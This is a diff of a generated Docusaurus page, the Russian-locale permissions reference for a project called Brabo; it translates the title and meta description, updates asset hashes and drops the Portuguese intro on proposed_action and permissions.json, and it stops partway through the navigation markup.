@@ -1,15 +1,15 @@
-<!doctype html><html lang=ru dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reference/permissions" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>Permissões | Brabo</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=robots content="noindex, nofollow"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:url content=https://daneiel.github.io/brabo/dev/ru/reference/permissions /><meta data-rh=true property=og:locale content=ru /><meta data-rh=true property=og:locale:alternate content=pt_BR /><meta data-rh=true property=og:locale:alternate content=en /><meta data-rh=true property=og:locale:alternate content=zh_Hans /><meta data-rh=true name=docusaurus_locale content=ru /><meta data-rh=true name=docsearch:language content=ru /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="Permissões | Brabo"/><meta data-rh=true name=description content="O formato do permissions.json, como um padrão casa com um comando e a ordem exata em que a decisão é tomada."/><meta data-rh=true property=og:description content="O formato do permissions.json, como um padrão casa com um comando e a ordem exata em que a decisão é tomada."/><meta data-rh=true name=keywords content=permissions.json,approval,policy,deny,allow,proposed_action /><link data-rh=true rel=icon href=/brabo/dev/ru/img/favicon.ico /><link data-rh=true rel=canonical href=https://daneiel.github.io/brabo/dev/ru/reference/permissions /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=pt-BR /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/en/reference/permissions hreflang=en /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/ru/reference/permissions hreflang=ru /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions hreflang=zh-Hans /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://daneiel.github.io/brabo/dev/ru/reference/permissions","name":"Права доступа","position":1}]}</script><link rel=stylesheet href=/brabo/dev/ru/assets/css/styles.41f6b491.css /><script src=/brabo/dev/ru/assets/js/runtime~main.99aa6d73.js defer></script><script src=/brabo/dev/ru/assets/js/main.2b73b81d.js defer></script></head><body><svg style="display: none;"><defs>
+<!doctype html><html lang=ru dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reference/permissions" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>Разрешения | Brabo</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=robots content="noindex, nofollow"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:url content=https://daneiel.github.io/brabo/dev/ru/reference/permissions /><meta data-rh=true property=og:locale content=ru /><meta data-rh=true property=og:locale:alternate content=pt_BR /><meta data-rh=true property=og:locale:alternate content=en /><meta data-rh=true property=og:locale:alternate content=zh_Hans /><meta data-rh=true name=docusaurus_locale content=ru /><meta data-rh=true name=docsearch:language content=ru /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="Разрешения | Brabo"/><meta data-rh=true name=description content="Формат permissions.json, как шаблон сопоставляется с командой и точный порядок, в котором принимается решение."/><meta data-rh=true property=og:description content="Формат permissions.json, как шаблон сопоставляется с командой и точный порядок, в котором принимается решение."/><meta data-rh=true name=keywords content=permissions.json,approval,policy,deny,allow,proposed_action /><link data-rh=true rel=icon href=/brabo/dev/ru/img/favicon.ico /><link data-rh=true rel=canonical href=https://daneiel.github.io/brabo/dev/ru/reference/permissions /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=pt-BR /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/en/reference/permissions hreflang=en /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/ru/reference/permissions hreflang=ru /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions hreflang=zh-Hans /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://daneiel.github.io/brabo/dev/ru/reference/permissions","name":"Права доступа","position":1}]}</script><link rel=stylesheet href=/brabo/dev/ru/assets/css/styles.41f6b491.css /><script src=/brabo/dev/ru/assets/js/runtime~main.2e5ed32f.js defer></script><script src=/brabo/dev/ru/assets/js/main.9039548a.js defer></script></head><body><svg style="display: none;"><defs>
 <symbol id=theme-svg-external-link viewBox="0 0 24 24"><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
 </defs></svg>
-<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-952")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/brabo/dev/ru/img/logo.svg /><div role=region aria-label="Перейти к основному содержимому"><a class=skipToContent_CFOX href=#__docusaurus_skipToContent_fallback>Перейти к основному содержимому</a></div><nav aria-label="Главная навигация" class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label="Переключить навигационную панель" aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/brabo/dev/ru/><div class=navbar__logo><img src=/brabo/dev/ru/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--light_vzqw"/><img src=/brabo/dev/ru/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--dark_FhTf"/></div><b class="navbar__title text--truncate">Brabo</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/brabo/dev/ru/>Документация</a><a class="navbar__item navbar__link" href=/brabo/dev/ru/runbook>Руководство по эксплуатации</a><a class="navbar__item navbar__link" href=/brabo/dev/ru/adr>Решения (ADR)</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link><svg viewBox="0 0 24 24" width=20 height=20 aria-hidden=true class=iconLanguage_g_CG><path fill=currentColor d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>Русский</a><ul class=dropdown__menu><li><a href=/brabo/dev/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=pt-BR>Português (Brasil)</a><li><a href=/brabo/dev/en/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=en>English</a><li><a href=/brabo/dev/ru/reference/permissions target=_self rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang=ru>Русский</a><li><a href=/brabo/dev/zh-Hans/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=zh-Hans>简体中文</a></ul></div><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link>dev</a><ul class=dropdown__menu><li><a href=https://daneiel.github.io/brabo/prd/ target=_blank rel="noopener noreferrer" class=dropdown__link>prd — estável<svg width=12 height=12 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/qa/ target=_blank rel="noopener noreferrer" class=dropdown__link>qa — кандидат<svg width=12 height=12 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/dev/ target=_blank rel="noopener noreferrer" class=dropdown__link>dev — em desenvolvimento ✓<svg width=12 height=12 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><div class="toggle_pnX7 colorModeToggle_Dj3Z"><button class="clean-btn toggleButton_DKER toggleButtonDisabled_qzkp" type=button disabled title="системный режим" aria-label="Переключение между темным и светлым режимом (сейчас используется системный режим)"><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL lightToggleIcon_E8tM"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL darkToggleIcon_rXjT"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL systemToggleIcon_zwCm"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_zRAa><div class="navbar__search searchBarContainer_eGzj" dir=ltr><svg aria-hidden=true class=searchIcon_PXpx focusable=false viewBox="0 0 16 16"><path fill=currentColor d="M6.02945 10.20327a4.17382 4.17382 0 1 1 4.17382-4.17382 4.15609 4.15609 0 0 1-4.17382 4.17382Zm9.69195 4.2199-4.8225-4.82338A5.88021 5.88021 0 0 0 12.058 6.02856 6.00467 6.00467 0 1 0 9.59979 10.8989l4.82338 4.82338a.89729.89729 0 0 0 1.29912 0 .89749.89749 0 0 0-.00087-1.29909Z"/></svg><input placeholder=Поиск aria-label=Search class="navbar__search-input searchInput_xOBI" value="" /><div class="loadingRing_JccP searchBarLoadingRing_aTss"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_WJkx"><div class=docsWrapper_mIeg><button aria-label="Прокрутка к началу" class="clean-btn theme-back-to-top-button backToTopButton_Afc8" type=button></button><div class=docRoot_XZYc><aside class="theme-doc-sidebar-container docSidebarContainer_FPqZ"><div class=sidebarViewport_waOe><div class=sidebar_RQC4><nav aria-label="Боковая панель документации" class="menu thin-scrollbar menu_ZM4U"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/><span class=categoryLinkLabel_jKch>🚀 Начните здесь</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/><span class=linkLabel_CzBh>Введение</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/getting-started><span class=linkLabel_CzBh>Первые шаги</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/tutorials/from-zero-to-deliverable><span class=linkLabel_CzBh>С нуля до готового результата</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/architecture><span class=categoryLinkLabel_jKch>🏗️ Архитектура</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/architecture><span class=linkLabel_CzBh>Архитектура</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist" tabindex=0 href=/brabo/dev/ru/adr><span class=categoryLinkLabel_jKch>Решения (ADR)</span></a><button aria-label="Развернуть категорию 'Решения (ADR)'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/business-rules><span class=categoryLinkLabel_jKch>📐 Правила</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/business-rules><span class=linkLabel_CzBh>Бизнес-правила</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/business-rules/custo><span class=linkLabel_CzBh>Стоимость и metering</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/business-rules/autenticacao><span class=linkLabel_CzBh>Аутентификация</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role=button aria-expanded=true href=/brabo/dev/ru/reference/configuration><span class=categoryLinkLabel_jKch>📖 Справочник</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/configuration><span class=linkLabel_CzBh>Конфигурация</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/events><span class=linkLabel_CzBh>События</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/brabo/dev/ru/reference/permissions><span class=linkLabel_CzBh>Права доступа</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/artifacts><span class=linkLabel_CzBh>Артефакты</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/git-providers><span class=linkLabel_CzBh>Git-провайдеры</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/internal-api><span class=linkLabel_CzBh>Внутренний API</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/scripts><span class=linkLabel_CzBh>Скрипты и команды</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/rulesets><span class=linkLabel_CzBh>Правила репозитория (rulesets)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/paridade-de-traducao><span class=linkLabel_CzBh>Паритет переводов</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/brb><span class=linkLabel_CzBh>Реестр BRB</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/security-surface><span class=linkLabel_CzBh>Открытая поверхность api</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/reference/api><span class=linkLabel_CzBh>Справочник API</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>💡 Пояснения</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true tabindex=0 href=/brabo/dev/ru/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>Процесс и конвейер</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/documentation-workflow><span class=linkLabel_CzBh>Синхронизация документации</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/branching-policy><span class=linkLabel_CzBh>Политика веток</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/cadeia-de-suprimentos-do-ci><span class=linkLabel_CzBh>Цепочка поставок CI</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/gates><span class=linkLabel_CzBh>Gates и то, как они измеряются</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/observability><span class=linkLabel_CzBh>Наблюдаемость</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/explanation/modelo-de-time><span class=linkLabel_CzBh>Модель команды и поток результатов</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/primeiro-dogfooding><span class=categoryLinkLabel_jKch>Проверки и измерения</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/historico-de-fases><span class=categoryLinkLabel_jKch>История фаз</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/localizacao><span class=categoryLinkLabel_jKch>Локализация</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/ru/explanation/tanstack-ai><span class=categoryLinkLabel_jKch>Технические заметки</span></a></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/runbook><span class=categoryLinkLabel_jKch>🛠️ Эксплуатация</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/runbook><span class=linkLabel_CzBh>Руководство по эксплуатации</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/ru/glossary><span class=categoryLinkLabel_jKch>📚 Словарь</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/ru/glossary><span class=linkLabel_CzBh>Глоссарий</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true><span class=categoryLinkLabel_jKch>🤝 Участие</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>Как внести вклад</span><svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>Где попросить помощи</span><svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>Сообщить об уязвимости</span><svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></ul></nav></div></div></aside><main class=docMainContainer_ia8v><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_xjE4"><div class=docItemContainer_cPej><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_sZul" aria-label="Навигационная цепочка текущей страницы"><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label="Главная страница" class=breadcrumbs__link href=/brabo/dev/ru/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_AUjL><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><span class=breadcrumbs__link>📖 Справочник</span><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>Права доступа</span></ul></nav><div class="tocCollapsible_nbAK theme-doc-toc-mobile tocMobile_r92C"><button type=button class="clean-btn tocCollapsibleButton_hcyq">Содержание этой страницы</button></div><div class="alert alert--warning margin-bottom--md" role=note data-faixa-de-traducao="">Эта страница ещё не переведена; вы читаете оригинал на португальском.</div><div class="theme-doc-markdown markdown"><header><h1>Permissões</h1></header>
-<p>Toda ação com efeito externo nasce como <code>proposed_action</code> e passa por aqui
-antes de executar. Esta página é o formato e a semântica exatos — as regras
-em si estão em <a href=/brabo/dev/ru/business-rules#rn-004 target=_blank rel="noopener noreferrer" class="">Regras de negócio</a>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-arquivo>O arquivo<a href=#o-arquivo class=hash-link aria-label="Прямая ссылка на O arquivo" title="Прямая ссылка на O arquivo" translate=no>​</a></h2>
-<p><code>permissions.json</code> mora na <strong>raiz do workspace do projeto</strong> — é um arquivo
-real em disco, versionável, não uma coluna no banco.</p>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-952")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/brabo/dev/ru/img/logo.svg /><div role=region aria-label="Перейти к основному содержимому"><a class=skipToContent_CFOX href=#__docusaurus_skipToContent_fallback>Перейти к основному содержимому</a></div><nav aria-label="Главная навигация" class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label="Переключить навигационную панель" aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/brabo/dev/ru/><div class=navbar__logo><img src=/brabo/dev/ru/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--light_vzqw"/><img src=/brabo/dev/ru/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--dark_FhTf"/></div><b class="navbar__title text--truncate">Brabo</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/brabo/dev/ru/>Документация</a><a class="navbar__item navbar__link" href=/brabo/dev/ru/runbook>Руководство по эксплуатации</a><a class="navbar__item navbar__link" href=/brabo/dev/ru/adr>Решения (ADR)</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# 